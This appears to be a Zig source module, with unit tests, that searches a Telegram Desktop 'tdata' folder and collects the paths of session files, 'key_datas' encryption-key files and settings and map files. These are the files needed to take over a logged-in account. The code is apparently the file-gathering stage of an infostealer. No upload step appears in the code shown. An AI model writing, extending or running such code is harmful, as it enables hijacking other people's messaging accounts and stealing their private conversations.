const std = @import("std");

const TDATA = "tdata";

pub fn collect(allocator: std.mem.Allocator, app_data: []const u8) ![][]const u8 {
    const tdata_path = try std.fs.path.join(allocator, &[_][]const u8{ app_data, TDATA });
    defer allocator.free(tdata_path);

    var dir = std.fs.openDirAbsolute(tdata_path, .{ .iterate = true }) catch return try allocator.alloc([]const u8, 0);
    defer dir.close();

    var files = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (files.items) |f| allocator.free(f);
        files.deinit();
    }

    var iter = dir.iterate();
    while (iter.next() catch {}) |entry| {
        if (entry.kind != .file) continue;
        const name = entry.name;

        if (collectSessionFile(&files, allocator, tdata_path, name)) continue;
        if (collectKeyData(&files, allocator, tdata_path, name)) continue;
        if (collectSpecialFile(&files, allocator, tdata_path, name)) continue;
    }

    try collectNestedKeyDatas(allocator, tdata_path, &files);

    return files.toOwnedSlice();
}

fn collectSessionFile(files: *std.ArrayList([]const u8), allocator: std.mem.Allocator, base: []const u8, name: []const u8) bool {
    if (name.len != 17) return false;
    if (name[name.len - 1] != 's') return false;
    const path = std.fs.path.join(allocator, &[_][]const u8{ base, name }) catch return false;
    files.append(path) catch {
        allocator.free(path);
        return false;
    };
    return true;
}

fn collectKeyData(files: *std.ArrayList([]const u8), allocator: std.mem.Allocator, base: []const u8, name: []const u8) bool {
    if (!std.mem.endsWith(u8, name, "key_datas")) return false;
    const path = std.fs.path.join(allocator, &[_][]const u8{ base, name }) catch return false;
    files.append(path) catch {
        allocator.free(path);
        return false;
    };
    return true;
}

fn collectSpecialFile(files: *std.ArrayList([]const u8), allocator: std.mem.Allocator, base: []const u8, name: []const u8) bool {
    const prefixes = [_][]const u8{ "usertag", "settings", "configs", "maps" };
    for (prefixes) |prefix| {
        if (std.mem.startsWith(u8, name, prefix)) {
            const path = std.fs.path.join(allocator, &[_][]const u8{ base, name }) catch return false;
            files.append(path) catch {
                allocator.free(path);
                return false;
            };
            return true;
        }
    }
    return false;
}

fn collectNestedKeyDatas(allocator: std.mem.Allocator, tdata_path: []const u8, files: *std.ArrayList([]const u8)) !void {
    var dir = std.fs.openDirAbsolute(tdata_path, .{ .iterate = true }) catch return;
    defer dir.close();

    var iter = dir.iterate();
    while (iter.next() catch return) |entry| {
        if (entry.kind != .directory) continue;
        const sub_path = try std.fs.path.join(allocator, &[_][]const u8{ tdata_path, entry.name });
        defer allocator.free(sub_path);

        var sub_dir = std.fs.openDirAbsolute(sub_path, .{ .iterate = true }) catch continue;
        defer sub_dir.close();

        var sub_iter = sub_dir.iterate();
        while (sub_iter.next() catch break) |sub_entry| {
            if (sub_entry.kind != .file) continue;
            if (!std.mem.endsWith(u8, sub_entry.name, "key_datas")) continue;
            const full = try std.fs.path.join(allocator, &[_][]const u8{ sub_path, sub_entry.name });
            try files.append(full);
        }
    }
}

test "collect returns empty for nonexistent path" {
    const result = try collect(std.testing.allocator, "C:\\__nonexistent__telegram");
    defer std.testing.allocator.free(result);
    try std.testing.expectEqual(@as(usize, 0), result.len);
}

test "collectSessionFile matches 17-char names ending with s" {
    var list = std.ArrayList([]const u8).init(std.testing.allocator);
    defer {
        for (list.items) |f| std.testing.allocator.free(f);
        list.deinit();
    }
    try std.testing.expect(collectSessionFile(&list, std.testing.allocator, "C:\\base", "abcdefghijklmno1s"));
    try std.testing.expectEqual(@as(usize, 1), list.items.len);
}

test "collectSessionFile rejects wrong length" {
    var list = std.ArrayList([]const u8).init(std.testing.allocator);
    defer list.deinit();
    try std.testing.expect(!collectSessionFile(&list, std.testing.allocator, "C:\\base", "short.s"));
}

test "collectSessionFile rejects non-s ending" {
    var list = std.ArrayList([]const u8).init(std.testing.allocator);
    defer list.deinit();
    try std.testing.expect(!collectSessionFile(&list, std.testing.allocator, "C:\\base", "abcdefghijklmno1x"));
}

test "collectKeyData matches key_datas suffix" {
    var list = std.ArrayList([]const u8).init(std.testing.allocator);
    defer {
        for (list.items) |f| std.testing.allocator.free(f);
        list.deinit();
    }
    try std.testing.expect(collectKeyData(&list, std.testing.allocator, "C:\\base", "0_key_datas"));
    try std.testing.expect(collectKeyData(&list, std.testing.allocator, "C:\\base", "1_key_datas"));
}

test "collectKeyData rejects non-matching" {
    var list = std.ArrayList([]const u8).init(std.testing.allocator);
    defer list.deinit();
    try std.testing.expect(!collectKeyData(&list, std.testing.allocator, "C:\\base", "something_else"));
}

test "collectSpecialFile matches prefixes" {
    var list = std.ArrayList([]const u8).init(std.testing.allocator);
    defer {
        for (list.items) |f| std.testing.allocator.free(f);
        list.deinit();
    }
    try std.testing.expect(collectSpecialFile(&list, std.testing.allocator, "C:\\base", "usertag"));
    try std.testing.expect(collectSpecialFile(&list, std.testing.allocator, "C:\\base", "settings_0"));
    try std.testing.expect(collectSpecialFile(&list, std.testing.allocator, "C:\\base", "configs_1"));
    try std.testing.expect(collectSpecialFile(&list, std.testing.allocator, "C:\\base", "maps_2"));
    try std.testing.expectEqual(@as(usize, 4), list.items.len);
}
